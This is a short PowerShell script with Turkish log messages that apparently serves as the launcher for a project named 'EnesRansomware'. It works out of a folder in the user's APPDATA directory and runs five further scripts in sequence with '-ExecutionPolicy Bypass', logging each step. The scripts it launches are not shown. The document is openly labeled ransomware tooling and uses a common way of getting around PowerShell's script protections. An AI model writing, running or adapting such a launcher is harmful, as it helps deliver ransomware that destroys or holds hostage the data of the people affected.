$base = "$env:APPDATA\EnesRansomware"
$log = "$base\log.txt"

function Hook {
    param ($step)
    Add-Content -Path $log -Value "$(Get-Date -Format 'u') - $step çalıştırıldı."
}

Hook "Başlangıç"
foreach ($i in 1..5) {
    Hook "$i.ps1 çalıştırılıyor"
    powershell.exe -ExecutionPolicy Bypass -File "$base\$i.ps1"
}
Hook "Tüm adımlar tamamlandı"

